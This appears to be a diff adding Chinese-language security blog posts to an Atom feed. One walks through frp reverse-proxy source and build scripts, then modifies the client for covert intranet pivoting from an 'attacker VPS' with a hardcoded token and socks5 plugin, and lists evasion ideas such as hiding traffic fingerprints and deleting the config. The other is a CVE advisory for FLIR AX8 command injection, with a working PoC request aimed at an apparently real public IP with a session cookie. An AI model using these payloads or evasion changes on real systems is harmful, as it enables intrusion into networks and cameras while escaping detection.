+			svr.ctlMu.Lock()
+			svr.ctl = ctl
+			svr.ctlMu.Unlock()
+			break
+		}
+	}
+
+	go svr.keepControllerWorking()
+
+	if g.GlbClientCfg.AdminPort != 0 {
+		err := svr.RunAdminServer(g.GlbClientCfg.AdminAddr, g.GlbClientCfg.AdminPort)
+		if err != nil {
+			log.Warn(&quot;run admin server error: %v&quot;, err)
+		}
+		log.Info(&quot;admin server listen on %s:%d&quot;, g.GlbClientCfg.AdminAddr, g.GlbClientCfg.AdminPort)
+	}
+
+	&lt;-svr.closedCh
+	return nil
+}
+</code></pre>
+<p>可以看到，客户端启动之后，就是一个 <code>for</code> 循环，写入 <code>login</code> 信息，也就是刚才 <code>frps</code> 里的 <code>msg.loginMsg</code>， 然后起一个 <code>goroutine</code> 执行 <code>keepControllerWorking()</code>，之后主 <code>goroutine</code> 就阻塞在 <code>&lt;-svr.closedCh</code>。 看看 <code>keepControllerWorking()</code> 的内容：</p>
+<pre><code class="language-go">func (svr *Service) keepControllerWorking() {
+	maxDelayTime := 20 * time.Second
+	delayTime := time.Second
+
+	for {
+		&lt;-svr.ctl.ClosedDoneCh()
+		if atomic.LoadUint32(&amp;svr.exit) != 0 {
+			return
+		}
+
+		for {
+			log.Info(&quot;try to reconnect to server...&quot;)
+			conn, session, err := svr.login()
+			if err != nil {
+				log.Warn(&quot;reconnect to server error: %v&quot;, err)
+				time.Sleep(delayTime)
+				delayTime = delayTime * 2
+				if delayTime &gt; maxDelayTime {
+					delayTime = maxDelayTime
+				}
+				continue
+			}
+			// reconnect success, init delayTime
+			delayTime = time.Second
+
+			ctl := NewControl(svr.runId, conn, session, svr.pxyCfgs, svr.visitorCfgs)
+			ctl.Run()
+			svr.ctlMu.Lock()
+			svr.ctl = ctl
+			svr.ctlMu.Unlock()
+			break
+		}
+	}
+}
+</code></pre>
+<p>基本上就是一个循环，里面最终是为了成功连接然后执行 <code>ctl.Run()</code>：</p>
+<pre><code class="language-go">func (ctl *Control) Run() {
+	go ctl.worker()
+
+	// start all proxies
+	ctl.pm.Reload(ctl.pxyCfgs)
+
+	// start all visitors
+	go ctl.vm.Run()
+	return
+}
+
+// If controler is notified by closedCh, reader and writer and handler will exit
+func (ctl *Control) worker() {
+	go ctl.msgHandler()
+	go ctl.reader()
+	go ctl.writer()
+
+	select {
+	case &lt;-ctl.closedCh:
+		// close related channels and wait until other goroutines done
+		close(ctl.readCh)
+		ctl.readerShutdown.WaitDone()
+		ctl.msgHandlerShutdown.WaitDone()
+
+		close(ctl.sendCh)
+		ctl.writerShutdown.WaitDone()
+
+		ctl.pm.Close()
+		ctl.vm.Close()
+
+		close(ctl.closedDoneCh)
+		if ctl.session != nil {
+			ctl.session.Close()
+		}
+		return
+	}
+}
+
+// msgHandler handles all channel events and do corresponding operations.
+func (ctl *Control) msgHandler() {
+	defer func() {
+		if err := recover(); err != nil {
+			ctl.Error(&quot;panic error: %v&quot;, err)
+			ctl.Error(string(debug.Stack()))
+		}
+	}()
+	defer ctl.msgHandlerShutdown.Done()
+
+	hbSend := time.NewTicker(time.Duration(g.GlbClientCfg.HeartBeatInterval) * time.Second)
+	defer hbSend.Stop()
+	hbCheck := time.NewTicker(time.Second)
+	defer hbCheck.Stop()
+
+	ctl.lastPong = time.Now()
+
+	for {
+		select {
+		case &lt;-hbSend.C:
+			// send heartbeat to server
+			ctl.Debug(&quot;send heartbeat to server&quot;)
+			ctl.sendCh &lt;- &amp;msg.Ping{}
+		case &lt;-hbCheck.C:
+			if time.Since(ctl.lastPong) &gt; time.Duration(g.GlbClientCfg.HeartBeatTimeout)*time.Second {
+				ctl.Warn(&quot;heartbeat timeout&quot;)
+				// let reader() stop
+				ctl.conn.Close()
+				return
+			}
+		case rawMsg, ok := &lt;-ctl.readCh:
+			if !ok {
+				return
+			}
+
+			switch m := rawMsg.(type) {
+			case *msg.ReqWorkConn:
+				go ctl.HandleReqWorkConn(m)
+			case *msg.NewProxyResp:
+				ctl.HandleNewProxyResp(m)
+			case *msg.Pong:
+				ctl.lastPong = time.Now()
+				ctl.Debug(&quot;receive heartbeat from server&quot;)
+			}
+		}
+	}
+}
+
+// reader read all messages from frps and send to readCh
+func (ctl *Control) reader() {
+	defer func() {
+		if err := recover(); err != nil {
+			ctl.Error(&quot;panic error: %v&quot;, err)
+			ctl.Error(string(debug.Stack()))
+		}
+	}()
+	defer ctl.readerShutdown.Done()
+	defer close(ctl.closedCh)
+
+	encReader := crypto.NewReader(ctl.conn, []byte(g.GlbClientCfg.Token))
+	for {
+		if m, err := msg.ReadMsg(encReader); err != nil {
+			if err == io.EOF {
+				ctl.Debug(&quot;read from control connection EOF&quot;)
+				return
+			} else {
+				ctl.Warn(&quot;read error: %v&quot;, err)
+				ctl.conn.Close()
+				return
+			}
+		} else {
+			ctl.readCh &lt;- m
+		}
+	}
+}
+
+// writer writes messages got from sendCh to frps
+func (ctl *Control) writer() {
+	defer ctl.writerShutdown.Done()
+	encWriter, err := crypto.NewWriter(ctl.conn, []byte(g.GlbClientCfg.Token))
+	if err != nil {
+		ctl.conn.Error(&quot;crypto new writer error: %v&quot;, err)
+		ctl.conn.Close()
+		return
+	}
+	for {
+		if m, ok := &lt;-ctl.sendCh; !ok {
+			ctl.Info(&quot;control writer is closing&quot;)
+			return
+		} else {
+			if err := msg.WriteMsg(encWriter, m); err != nil {
+				ctl.Warn(&quot;write message to control connection error: %v&quot;, err)
+				return
+			}
+		}
+	}
+}
+</code></pre>
+<p><code>reader</code> 从frps收信息，然后写到 <code>ctl.readCh</code> 这个 channel 里，<code>writer</code> 则相反， 从 <code>ctl.sendCh</code> 收信息，写到 frps，而 <code>msgHandler</code> 则从frpc里读取信息，放到 <code>ctl.sendCh</code>， 从 <code>ctl.readCh</code> 读取信息，处理之。</p>
+<p>之所以这样设计，是为了能够异步处理所有消息。看看 <code>msgHandler</code> 的关键部分：</p>
+<pre><code class="language-go">switch m := rawMsg.(type) {
+case *msg.ReqWorkConn:
+    go ctl.HandleReqWorkConn(m)
+case *msg.NewProxyResp:
+    ctl.HandleNewProxyResp(m)
+case *msg.Pong:
+    ctl.lastPong = time.Now()
+    ctl.Debug(&quot;receive heartbeat from server&quot;)
+}
+</code></pre>
+<p>frps 每次收到一个请求之后，然后下发一个指令给frpc，要求frpc建立连接， 然后frps再把新来的连接与请求所在的连接串起来，完成代理，<code>msg.ReqWorkConn</code> 就是这个指令。</p>
+<p>1.流量特征</p>
+<p>路径：<code>/pkg/msg/msg.go</code></p>
+<figure data-type="image" tabindex="1"><img src="https://cdn.nlark.com/yuque/0/2021/png/1182121/1625454232642-563b2b20-a2f1-4da1-a1fc-9dbcc4aa1cf0.png" alt="img" loading="lazy"></figure>
+<p>上面得注释说的很清楚 当客户端连接时 会发送这些信息给服务端</p>
+<figure data-type="image" tabindex="2"><img src="https://cdn.nlark.com/yuque/0/2021/png/1182121/1625454333334-f5d0ab52-479f-45ba-8608-6055f7772100.png" alt="img" loading="lazy"></figure>
+<p>路径:<code>/frp/cmd/frpc/sub/root.go</code></p>
+<pre><code class="language-go">// 包声明
+package sub
+
+// 导入所需的包
+import (
+	&quot;context&quot;
+	&quot;fmt&quot;
+	&quot;io/fs&quot;
+	&quot;os&quot;
+	&quot;os/signal&quot;
+	&quot;path/filepath&quot;
+	&quot;sync&quot;
+	&quot;syscall&quot;
+	&quot;time&quot;
+
+	&quot;github.com/spf13/cobra&quot;
+
+	&quot;github.com/fatedier/frp/client&quot;
+	&quot;github.com/fatedier/frp/pkg/config&quot;
+	v1 &quot;github.com/fatedier/frp/pkg/config/v1&quot;
+	&quot;github.com/fatedier/frp/pkg/config/v1/validation&quot;
+	&quot;github.com/fatedier/frp/pkg/util/log&quot;
+	&quot;github.com/fatedier/frp/pkg/util/version&quot;
+)
+
+// 定义全局变量
+var (
+	cfgFile          string // 配置文件路径
+	cfgDir           string // 配置目录路径
+	showVersion      bool   // 是否显示版本信息
+	strictConfigMode bool   // 是否严格解析配置文件
+)
+
+// init函数在包初始化时调用，用于设置命令行参数
+func init() {
+	rootCmd.PersistentFlags().StringVarP(&amp;cfgFile, &quot;config&quot;, &quot;c&quot;, &quot;./frpc.ini&quot;, &quot;config file of frpc&quot;)
+	rootCmd.PersistentFlags().StringVarP(&amp;cfgDir, &quot;config_dir&quot;, &quot;&quot;, &quot;&quot;, &quot;config directory, run one frpc service for each file in config directory&quot;)
+	rootCmd.PersistentFlags().BoolVarP(&amp;showVersion, &quot;version&quot;, &quot;v&quot;, false, &quot;version of frpc&quot;)
+	rootCmd.PersistentFlags().BoolVarP(&amp;strictConfigMode, &quot;strict_config&quot;, &quot;&quot;, true, &quot;strict config parsing mode, unknown fields will cause an errors&quot;)
+}
+
+// 定义rootCmd命令
+var rootCmd = &amp;cobra.Command{
+	Use:   &quot;frpc&quot;,  // 命令名称
+	Short: &quot;frpc is the client of frp (https://github.com/fatedier/frp)&quot;,  // 命令简短描述
+	RunE: func(cmd *cobra.Command, args []string) error {
+		if showVersion {  // 如果设置了版本信息标志，则打印版本信息并退出
+			fmt.Println(version.Full())
+			return nil
+		}
+
+		// 如果设置了配置目录，则为目录中的每个配置文件启动一个frpc服务
+		if cfgDir != &quot;&quot; {
+			_ = runMultipleClients(cfgDir)
+			return nil
+		}
+
+		// 运行frpc客户端
+		err := runClient(cfgFile)
+		if err != nil {
+			fmt.Println(err)
+			os.Exit(1)
+		}
+		return nil
+	},
+}
+
+// runMultipleClients函数用于为配置目录中的每个配置文件启动一个frpc服务
+func runMultipleClients(cfgDir string) error {
+	var wg sync.WaitGroup
+	err := filepath.WalkDir(cfgDir, func(path string, d fs.DirEntry, err error) error {
+		if err != nil || d.IsDir() {
+			return nil
+		}
+		wg.Add(1)
+		time.Sleep(time.Millisecond)
+		go func() {
+			defer wg.Done()
+			err := runClient(path)
+			if err != nil {
+				fmt.Printf(&quot;frpc service error for config file [%s]\n&quot;, path)
+			}
+		}()
+		return nil
+	})
+	wg.Wait()
+	return err
+}
+
+// Execute函数用于执行rootCmd命令
+func Execute() {
+	rootCmd.SetGlobalNormalizationFunc(config.WordSepNormalizeFunc)
+	if err := rootCmd.Execute(); err != nil {
+		os.Exit(1)
+	}
+}
+
+// handleTermSignal函数用于处理终止信号，优雅地关闭服务
+func handleTermSignal(svr *client.Service) {
+	ch := make(chan os.Signal, 1)
+	signal.Notify(ch, syscall.SIGINT, syscall.SIGTERM)
+	&lt;-ch
+	svr.GracefulClose(500 * time.Millisecond)
+}
+
+// runClient函数用于根据配置文件路径启动frpc客户端
+func runClient(cfgFilePath string) error {
+	cfg, proxyCfgs, visitorCfgs, isLegacyFormat, err := config.LoadClientConfig(cfgFilePath, strictConfigMode)
+	if err != nil {
+		return err
+	}
+	if isLegacyFormat {
+		fmt.Printf(&quot;WARNING: ini format is deprecated and the support will be removed in the future, &quot; +
+			&quot;please use yaml/json/toml format instead!\n&quot;)
+	}
+
+	warning, err := validation.ValidateAllClientConfig(cfg, proxyCfgs, visitorCfgs)
+	if warning != nil {
+		fmt.Printf(&quot;WARNING: %v\n&quot;, warning)
+	}
+	if err != nil {
+		return err
+	}
+	return startService(cfg, proxyCfgs, visitorCfgs, cfgFilePath)
+}
+
+// startService函数用于启动frpc服务
+func startService(
+	cfg *v1.ClientCommonConfig,
+	proxyCfgs []v1.ProxyConfigurer,
+	visitorCfgs []v1.VisitorConfigurer,
+	cfgFile string,
+) error {
+	log.InitLogger(cfg.Log.To, cfg.Log.Level, int(cfg.Log.MaxDays), cfg.Log.DisablePrintColor)
+
+	if cfgFile != &quot;&quot; {
+		log.Infof(&quot;start frpc service for config file [%s]&quot;, cfgFile)
+		defer log.Infof(&quot;frpc service for config file [%s] stopped&quot;, cfgFile)
+	}
+	svr, err := client.NewService(client.ServiceOptions{
+		Common:         cfg,
+		ProxyCfgs:      proxyCfgs,
+		VisitorCfgs:    visitorCfgs,
+		ConfigFilePath: cfgFile,
+	})
+	if err != nil {
+		return err
+	}
+
+	shouldGracefulClose := cfg.Transport.Protocol == &quot;kcp&quot; || cfg.Transport.Protocol == &quot;quic&quot;
+	// 如果使用kcp或quic协议，则捕获退出信号以优雅地关闭服务
+	if shouldGracefulClose {
+		go handleTermSignal(svr)
+	}
+	return svr.Run(context.Background())
+}
+</code></pre>
+<h2 id="frp编译"><code>FRP</code>编译</h2>
+<ul>
+<li>
+<p><code>FRP</code>编译需要配置好<code>gcc</code>以及<code>go</code>语言环境</p>
+</li>
+<li>
+<p><code>package.sh</code>文件如果在windows系统运行，需要在git环境中运行，我们输入sh，进入git环境</p>
+</li>
+</ul>
+<figure data-type="image" tabindex="3"><img src="https://yzs17.github.io/post-images/1733330401532.png" alt="" loading="lazy"></figure>
+<p>运行<code>package.sh</code>交叉编译后可以得到可执行文件</p>
+<p>代码分析</p>
+<p>这个 <code>package.sh</code> 脚本是一个 shell 脚本，用于编译 <code>frp</code>（Fast Reverse Proxy）项目的不同版本，并生成跨平台的安装包。以下是脚本中每个部分的作用：</p>
+<ol>
+<li><code>set -e</code>：这个命令告诉 shell 脚本在任何语句的执行结果不是 true 时就停止执行，这样可以在出现错误时立即停止，而不是继续执行后面的命令。</li>
+<li><code>make</code>：这个命令用于编译 <code>frp</code> 项目，生成可执行文件。</li>
+<li>检查 <code>make</code> 命令是否执行成功，如果不成功则打印错误信息并退出脚本。</li>
+<li>获取编译后的 <code>frp</code> 版本号，并打印出来。</li>
+<li><code>make -f ./Makefile.cross-compiles</code>：这个命令用于交叉编译 <code>frp</code>，生成不同操作系统和架构的版本。</li>
+<li>清理和创建发布目录，用于存放生成的安装包。</li>
+<li>定义了三个变量，分别包含支持的操作系统、架构和额外的编译选项。</li>
+<li>进入 <code>release</code> 目录。</li>
+<li>使用三个嵌套的循环遍历所有操作系统、架构和额外选项的组合。</li>
+<li>对于每种组合，生成相应的文件名后缀和目录名。</li>
+<li>根据操作系统的不同，将编译好的 <code>frpc</code> 和 <code>frps</code> 可执行文件移动到对应的目录，并重命名（如果是 Windows 系统，文件名会以 <code>.exe</code> 结尾）。</li>
+<li>将 <code>frp</code> 项目的许可证文件和配置文件复制到对应的目录。</li>
+<li>根据操作系统的不同，将目录打包成 <code>.zip</code> 文件（Windows）或 <code>.tar.gz</code> 文件（其他系统）。</li>
+<li>清理临时目录，为下一个组合做准备。</li>
+<li><code>cd -</code>：返回到脚本开始执行时的目录。</li>
+</ol>
+<p>作用：自动化编译 <code>frp</code> 项目，并生成适用于多种操作系统和架构的安装包，方便在不同环境下使用 <code>frp</code>。</p>
+<pre><code class="language-sh">#!/bin/sh
+set -e
+
+# 编译项目生成版本
+make
+if [ $? -ne 0 ]; then
+    echo &quot;make error&quot;
+    exit 1
+fi
+
+# 获取编译后的 frp 版本号
+frp_version=`./bin/frps --version`
+echo &quot;build version: $frp_version&quot;
+
+# 交叉编译，生成不同操作系统和架构的版本
+make -f ./Makefile.cross-compiles
+
+# 清理并创建发布目录
+rm -rf ./release/packages
+mkdir -p ./release/packages
+
+# 定义支持的操作系统、架构和额外编译选项
+os_all='linux windows darwin freebsd android'
+arch_all='386 amd64 arm arm64 mips64 mips64le mips mipsle riscv64 loong64'
+extra_all='_ hf'
+
+# 进入 release 目录
+cd ./release
+
+# 遍历所有操作系统
+for os in $os_all; do
+    # 遍历所有架构
+    for arch in $arch_all; do
+        # 遍历所有额外编译选项
+        for extra in $extra_all; do
+            # 生成文件名后缀
+            suffix=&quot;${os}_${arch}&quot;
+            if [ &quot;x${extra}&quot; != x&quot;_&quot; ]; then
+                suffix=&quot;${os}_${arch}_${extra}&quot;
+            fi
+            frp_dir_name=&quot;frp_${frp_version}_${suffix}&quot;
+            frp_path=&quot;./packages/frp_${frp_version}_${suffix}&quot;
+
+            # 对于 Windows 系统，文件名以 .exe 结尾
+            if [ &quot;x${os}&quot; = x&quot;windows&quot; ]; then
+                if [ ! -f &quot;./frpc_${os}_${arch}.exe&quot; ]; then
+                    continue
+                fi
+                if [ ! -f &quot;./frps_${os}_${arch}.exe&quot; ]; then
+                    continue
+                fi
+                mkdir ${frp_path}
+                mv ./frpc_${os}_${arch}.exe ${frp_path}/frpc.exe
+                mv ./frps_${os}_${arch}.exe ${frp_path}/frps.exe
+            else
+                # 对于其他系统，文件名不带 .exe
+                if [ ! -f &quot;./frpc_${suffix}&quot; ]; then
+                    continue
+                fi
+                if [ ! -f &quot;./frps_${suffix}&quot; ]; then
+                    continue
+                fi
+                mkdir ${frp_path}
+                mv ./frpc_${suffix} ${frp_path}/frpc
+                mv ./frps_${suffix} ${frp_path}/frps
+            fi  
+            # 复制许可证和配置文件
+            cp ../LICENSE ${frp_path}
+            cp -f ../conf/frpc.toml ${frp_path}
+            cp -f ../conf/frps.toml ${frp_path}
+
+            # 打包
+            cd ./packages
+            if [ &quot;x${os}&quot; = x&quot;windows&quot; ]; then
+                zip -rq ${frp_dir_name}.zip ${frp_dir_name}
+            else
+                tar -zcf ${frp_dir_name}.tar.gz ${frp_dir_name}
+            fi  
+            cd ..
+            # 清理临时目录
+            rm -rf ${frp_path}
+        done
+    done
+done
+
+# 返回到脚本开始执行时的目录
+cd -
+</code></pre>
+<h2 id="内网代理测试">内网代理测试</h2>
+<ul>
+<li>服务端：阿里云服务器（模拟攻击者公网<code>vps</code>）</li>
+<li>客户端：<code>Win11</code>本机（模拟一台能出网的内网靶机）</li>
+<li>该测试，模拟情景为，一台能出网的内网机和攻击者<code>vps</code></li>
+</ul>
+<figure data-type="image" tabindex="4"><img src="https://yzs17.github.io/post-images/1731666833016.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://yzs17.github.io/post-images/1731666874942.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://yzs17.github.io/post-images/1731666890628.png" alt="" loading="lazy"></figure>
+<ul>
+<li>可以看到，我将本地搭载的两个服务端口转发到我的服务器端口，实现了可以访问到内网机上的服务</li>
+</ul>
+<figure data-type="image" tabindex="7"><img src="https://yzs17.github.io/post-images/1731666911033.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://yzs17.github.io/post-images/1731666919320.png" alt="" loading="lazy"></figure>
+<h2 id="项目修改编译">项目修改编译</h2>
+<h4 id="frpcini的ip通过参数传入">frpc.ini的ip通过参数传入</h4>
+<p>Golang语法规则：</p>
+<ul>
+<li>golang的命名推荐使用驼峰命名法，必须以一个字母（Unicode字母）或下划线开头，后面可以跟任意数量的字母、数字或下划线。</li>
+<li>golang中根据首字母的大小写来确定可以访问的权限。无论是方法名、常量、变量名还是结构体的名称，如果首字母大写，则可以被其他的包访问；如果首字母小写，则只能在本包中使用</li>
+</ul>
+<p>不用上面的直接增加定义的方法，在<code>cmd/frpc/sub/root.go</code>写一个函数。</p>
+<pre><code>func getFileContent(ip string,port string) {
+	var content string = `[common]
+    server_addr = ` + ip + `
+    server_port = ` + port + `
+	tls_enable = true
+    privilege_token = pentest999
+    [http_proxy]
+    type = tcp
+    remote_port = 23333
+    plugin = socks5
+	`
+	fileContent = content
+}
+</code></pre>
+<p>然后在<code>cmd\frpc\root.go</code>中定义传参</p>
+<pre><code>func init() {
+	rootCmd.PersistentFlags().StringVarP(&amp;cfgFile, &quot;config&quot;, &quot;c&quot;, &quot;./frpc.ini&quot;, &quot;config file of frpc&quot;)
+	rootCmd.PersistentFlags().BoolVarP(&amp;showVersion, &quot;version&quot;, &quot;v&quot;, false, &quot;version of frpc&quot;)
+	rootCmd.PersistentFlags().StringVarP(&amp;ip, &quot;server_addr&quot;, &quot;t&quot;, &quot;&quot;, &quot;server_addr&quot;)
+	rootCmd.PersistentFlags().StringVarP(&amp;port, &quot;server_port&quot;, &quot;p&quot;, &quot;&quot;, &quot;server_port&quot;)
+	kcpDoneCh = make(chan struct{})
+}
+</code></pre>
+<p>修改<code>runClient</code>函数</p>
+<pre><code>func runClient(cfgFilePath string,ip string,port string) (err error) {
+	var content string
+	getFileContent(ip,port)
+	//scontent, err = config.GetRenderedConfFromFile(cfgFilePath)
+	content, err = fileContent, nil
+	if err != nil {
+		return
+	}
+
+	cfg, err := parseClientCommonCfg(CfgFileTypeIni, content)
+	if err != nil {
+		return
+	}
+
+	pxyCfgs, visitorCfgs, err := config.LoadAllConfFromIni(cfg.User, content, cfg.Start)
+	if err != nil {
+		return err
+	}
+
+	err = startService(cfg, pxyCfgs, visitorCfgs, cfgFilePath)
+	return
+}
+</code></pre>
+<p>在如下代码中调用<code>runClient()</code></p>
+<pre><code>var rootCmd = &amp;cobra.Command{
+	Use:   &quot;frpc&quot;,
+	Short: &quot;frpc is the client of frp (https://github.com/fatedier/frp)&quot;,
+	RunE: func(cmd *cobra.Command, args []string) error {
+		if showVersion {
+			fmt.Println(version.Full())
+			return nil
+		}
+		// Do not show command usage here.
+		err := runClient(cfgFile,ip,port)
+		if err != nil {
+			fmt.Println(err)
+			os.Exit(1)
+		}
+		return nil
+	},
+}
+</code></pre>
+<p>修改完上面的代码，就可以用</p>
+<pre><code>frpc.exe -t 8.138.152.157 -p 7001
+</code></pre>
+<p>来启动frpc.exe了。</p>
+<p>这种在Windows下不会暴露远程ip，但是在linux下还是会暴露的。</p>
+<p>所以可以直接加一些加密啥的，<code>-t</code>参数传入ip加密后的地址，然后在源码里加一个解密的步骤即可。</p>
+<p>同样也可以将ip地址以十进制或十六进制传入，然后在程序里转换会<code>1.1.1.1</code>格式。</p>
+<p>运行效果如上：</p>
+<h2 id="后续修改方向">后续修改方向</h2>
+<h4 id="1流量特征">1.流量特征</h4>
+<h4 id="2加密-压缩传输流量">2.加密、压缩传输流量</h4>
+<h4 id="3修改0x17特征">3.修改0x17特征</h4>
+<h4 id="4-隐藏frpcini-加载后删除">4. 隐藏frpc.ini 加载后删除</h4>
+<figure data-type="image" tabindex="9"><img src="https://yzs17.github.io/post-images/1731666404984.jpg" alt="" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CVE-2024-48762]]></title>
+        <id>https://yzs17.github.io/post/cve-2024-48762/</id>
+        <link href="https://yzs17.github.io/post/cve-2024-48762/">
+        </link>
+        <updated>2024-10-17T09:17:17.000Z</updated>
+        <content type="html"><![CDATA[<!-- more -->
+<h3 id="description">Description</h3>
+<blockquote>
+<p>Command injection vulnerability in /usr/www/application/models/settingscamera.php  in FLIR AX8 up to 1.46.16 allows attackers to run arbitrary commands via the value parameter.</p>
+</blockquote>
+<h3 id="note">Note:</h3>
+<p>This vulnerability is a backend issue that requires obtaining cookies. It  can exploit the unauthorized access vulnerability for arbitrary user  registration found at /tools/test_login.php?action=register. After  registering a new user, cookies can be obtained to achieve RCE (Remote  Code Execution).</p>
+<p>Also.Under normal circumstances, it has a weak password vulnerability with  default account credentials being 'admin' for both user and password too.  You can also obtain a cookie through this method.</p>
+<h3 id="poc">POC</h3>
+<pre><code>GET /settings/applyfirmware/;id&gt;test123.txt;/false HTTP/1.1
+Host: XXXX
+Priority: u=0, i
+Accept-Encoding: gzip, deflate
+Referer: XXXX
+Cookie: XXXX
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Upgrade-Insecure-Requests: 1
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+</code></pre>
+<p><strong>For example</strong></p>
+<ul>
+<li>This cookie must be changed</li>
+</ul>
+<pre><code>GET /settings/applyfirmware/;id&gt;test123.txt;/false HTTP/1.1
+Host: 222.103.211.89:8004
+Priority: u=0, i
+Accept-Encoding: gzip, deflate
+Referer: http://222.103.211.89:8004/
+Cookie: theme=light; distanceUnit=metric; temperatureUnit=celsius; showCameraId=false; clientTimeZoneOffset=-480; clientTimeZoneDST=0; PHPSESSID=fede7f79f208effcb87474d02fe6d53d
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Upgrade-Insecure-Requests: 1
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+</code></pre>
+<h3 id="response">Response</h3>
+<pre><code>HTTP/1.1 200 OK
+X-Powered-By: PHP/5.4.14
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-type: text/html
+Date: Mon, 11 Feb 2002 09:18:49 GMT
+Server: lighttpd/1.4.33
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162052579.png" alt="image-1" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162052081.png" alt="image-2" loading="lazy"></figure>
+]]></content>
+    </entry>
+</feed>
